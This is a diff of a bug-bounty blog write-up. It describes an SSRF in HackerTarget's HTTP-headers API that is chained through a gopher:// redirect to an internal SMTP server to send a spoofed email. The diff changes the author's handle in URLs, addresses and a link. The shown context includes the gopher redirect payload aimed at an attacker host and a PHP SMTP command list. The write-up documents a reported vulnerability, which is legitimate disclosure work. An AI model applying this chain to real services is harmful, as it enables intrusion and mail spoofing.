@@ -85,7 +85,7 @@ header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
 ```
 <br>
 In a nutshell, the gopher:// protocol sends 1 character, a new line (CR+LF), and the remaining data, which allows us to send a **multiline request**. <br><br>
-I started netcat and checked the API again: `https://api.hackertarget.com/httpheaders/?q=http://sxcurity.pro/redirect.php`. It followed the redirect  and I received a multiline request on port 1337!
+I started netcat and checked the API again: `https://api.hackertarget.com/httpheaders/?q=http://C0RB3N.pro/redirect.php`. It followed the redirect  and I received a multiline request on port 1337!
 <br><br>This means I could send valid commands to the internal SMTP server!
 
 ### &#127881;&nbsp;The Finale
@@ -95,9 +95,9 @@ I created another PHP file on my server that would redirect the API to the inter
         $commands = array(
                 'HELO hackertarget.com',
                 'MAIL FROM: <admin@hackertarget.com>',
-                'RCPT To: <sxcurity@oou.us>',
+                'RCPT To: <C0RB3N@oou.us>',
                 'DATA',
-                'Subject: @sxcurity!',
+                'Subject: @C0RB3N!',
                 'Corben was here, woot woot!',
                 '.'
         );
@@ -108,11 +108,11 @@ I created another PHP file on my server that would redirect the API to the inter
 ?>
 ```
 <br><br>
-I changed the query one last time: `https://api.hackertarget.com/httpheaders/?q=http://sxcurity.pro/smtp.php`
+I changed the query one last time: `https://api.hackertarget.com/httpheaders/?q=http://C0RB3N.pro/smtp.php`
 <br><br>
 I went to my email, reloaded it once.
 <br><br>
-A new email popped up from "<font id="highlighter">admin@hackertarget.com</font>" with the subject "<font id="highlighter">@sxcurity</font>" and the message was "<font id="highlighter2">Corben was here, woot woot!</font>"
+A new email popped up from "<font id="highlighter">admin@hackertarget.com</font>" with the subject "<font id="highlighter">@C0RB3N</font>" and the message was "<font id="highlighter2">Corben was here, woot woot!</font>"
 <br><br>
 After yelling 'heck yeah!', I created a quick proof-of-concept video and I sent it over to HackerTarget.
 <br> <br>Here's the video <font color="#2EB03D">&#128373;&#65039;</font><br>
@@ -132,4 +132,4 @@ Thanks for reading,<br><br>
 - <a class="link" href="https://twitter.com/hacker_"  target="_blank" rel="noopener noreferrer">https://twitter.com/hacker_</a>
 - <a class="link" href="https://hackerone.com/cdl" target="_blank" rel="noopener noreferrer">https://hackerone.com/cdl</a>
 - <a class="link" href="https://bugcrowd.com/c" target="_blank" rel="noopener noreferrer">https://bugcrowd.com/c</a>
-- <a class="link" href="https://github.com/sxcurity"  target="_blank" rel="noopener noreferrer">https://github.com/sxcurity</a>
+- <a class="link" href="https://github.com/C0RB3N"  target="_blank" rel="noopener noreferrer">https://github.com/sxcurity</a>
